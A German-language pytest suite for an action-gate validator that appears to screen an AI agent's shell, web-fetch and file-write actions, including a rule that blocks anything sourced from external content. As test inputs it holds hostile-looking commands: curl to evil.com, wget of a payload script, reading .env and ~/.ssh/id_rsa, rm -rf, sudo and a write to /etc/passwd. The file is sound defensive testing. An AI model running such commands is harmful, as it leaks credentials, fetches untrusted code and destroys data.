#!/usr/bin/env python3
"""
Unit-Tests für action_gate.py
Testet die Action-Gate-Validierungslogik
"""

import pytest
import sys
from pathlib import Path

# Füge scripts/ zu Python-Path hinzu
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from action_gate import validate_action, check_blocked_patterns, check_allowed_patterns


class TestBlockedPatterns:
    """Tests für blockierte Command-Patterns"""

    def test_blocks_curl_to_external_url(self):
        """Testet ob curl zu externer URL blockiert wird"""
        result = validate_action(
            action="bash",
            command="curl https://evil.com",
            source="system"
        )
        assert result["decision"] == "BLOCK"
        assert "Network request" in result["reason"]
        assert result["risk_level"] in ["HIGH", "CRITICAL"]

    def test_blocks_wget(self):
        """Testet ob wget blockiert wird"""
        result = validate_action(
            action="bash",
            command="wget http://malicious.site/payload.sh",
            source="system"
        )
        assert result["decision"] == "BLOCK"

    def test_blocks_ssh_connections(self):
        """Testet ob SSH-Verbindungen blockiert werden"""
        result = validate_action(
            action="bash",
            command="ssh user@remote.server",
            source="system"
        )
        assert result["decision"] == "BLOCK"
        assert "Remote connection" in result["reason"]

    def test_blocks_secret_file_access_env(self):
        """Testet ob Zugriff auf .env blockiert wird"""
        result = validate_action(
            action="bash",
            command="cat .env",
            source="system"
        )
        assert result["decision"] == "BLOCK"
        assert "Secret file" in result["reason"]
        assert result["risk_level"] == "CRITICAL"

    def test_blocks_ssh_key_access(self):
        """Testet ob Zugriff auf SSH-Keys blockiert wird"""
        result = validate_action(
            action="bash",
            command="cat ~/.ssh/id_rsa",
            source="system"
        )
        assert result["decision"] == "BLOCK"
        assert "SSH keys" in result["reason"]

    def test_blocks_destructive_rm_rf(self):
        """Testet ob rm -rf blockiert wird"""
        result = validate_action(
            action="bash",
            command="rm -rf /important/data",
            source="system"
        )
        assert result["decision"] == "BLOCK"
        assert "Destructive" in result["reason"]

    def test_blocks_sudo(self):
        """Testet ob sudo blockiert wird"""
        result = validate_action(
            action="bash",
            command="sudo apt install something",
            source="system"
        )
        assert result["decision"] == "BLOCK"
        assert "Privilege escalation" in result["reason"]


class TestAllowedPatterns:
    """Tests für erlaubte Command-Patterns"""

    def test_allows_python_script_in_scripts_dir(self):
        """Testet ob Python-Scripts in scripts/ erlaubt sind"""
        result = validate_action(
            action="bash",
            command="python3 scripts/validate_config.py config.md",
            source="system"
        )
        assert result["decision"] == "ALLOW"
        assert result["risk_level"] == "LOW"

    def test_allows_node_script_in_scripts_dir(self):
        """Testet ob Node-Scripts in scripts/ erlaubt sind"""
        result = validate_action(
            action="bash",
            command="node scripts/browser_cdp_helper.js navigate https://example.com",
            source="system"
        )
        assert result["decision"] == "ALLOW"

    def test_allows_jq(self):
        """Testet ob jq erlaubt ist"""
        result = validate_action(
            action="bash",
            command="jq '.candidates[] | .title' metadata/candidates.json",
            source="system"
        )
        assert result["decision"] == "ALLOW"

    def test_allows_grep(self):
        """Testet ob grep erlaubt ist"""
        result = validate_action(
            action="bash",
            command="grep -r 'error' logs/",
            source="system"
        )
        assert result["decision"] == "ALLOW"


class TestExternalContentSource:
    """Tests für externe Content-Quelle"""

    def test_blocks_all_actions_from_external_content(self):
        """Testet ob alle Actions von external_content blockiert werden"""
        # Selbst erlaubte Commands sollten blockiert werden wenn source=external_content
        result = validate_action(
            action="bash",
            command="python3 scripts/safe_script.py",
            source="external_content"
        )
        assert result["decision"] == "BLOCK"
        assert "external content" in result["reason"]
        assert result["risk_level"] == "HIGH"

    def test_allows_system_source(self):
        """Testet ob system-source erlaubt ist"""
        result = validate_action(
            action="bash",
            command="python3 scripts/validate_config.py",
            source="system"
        )
        assert result["decision"] == "ALLOW"


class TestWebFetchValidation:
    """Tests für WebFetch-URL-Validierung"""

    def test_allows_whitelisted_domain_ieee(self):
        """Testet ob IEEE-Domain erlaubt ist"""
        result = validate_action(
            action="webfetch",
            url="https://ieeexplore.ieee.org/document/12345",
            source="system"
        )
        assert result["decision"] == "ALLOW"

    def test_blocks_non_whitelisted_domain(self):
        """Testet ob nicht-whitelisted Domain blockiert wird"""
        result = validate_action(
            action="webfetch",
            url="https://random-site.com/data",
            source="system"
        )
        assert result["decision"] == "BLOCK"


class TestWriteOperations:
    """Tests für Write-Operationen"""

    def test_allows_write_in_runs_directory(self):
        """Testet ob Schreiben in runs/ erlaubt ist"""
        result = validate_action(
            action="write",
            command="runs/2026-02-18_14-30-00/metadata/state.json",
            source="system"
        )
        assert result["decision"] == "ALLOW"

    def test_blocks_write_outside_runs(self):
        """Testet ob Schreiben außerhalb runs/ blockiert wird"""
        result = validate_action(
            action="write",
            command="/etc/passwd",
            source="system"
        )
        assert result["decision"] == "BLOCK"


class TestEdgeCases:
    """Tests für Edge-Cases"""

    def test_case_insensitive_pattern_matching(self):
        """Testet ob Pattern-Matching case-insensitive ist"""
        result = validate_action(
            action="bash",
            command="CURL https://evil.com",
            source="system"
        )
        assert result["decision"] == "BLOCK"

    def test_detects_obfuscated_commands(self):
        """Testet Erkennung von leicht verschleierten Commands"""
        # curl mit extra Spaces
        result = validate_action(
            action="bash",
            command="curl  https://evil.com",
            source="system"
        )
        assert result["decision"] == "BLOCK"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
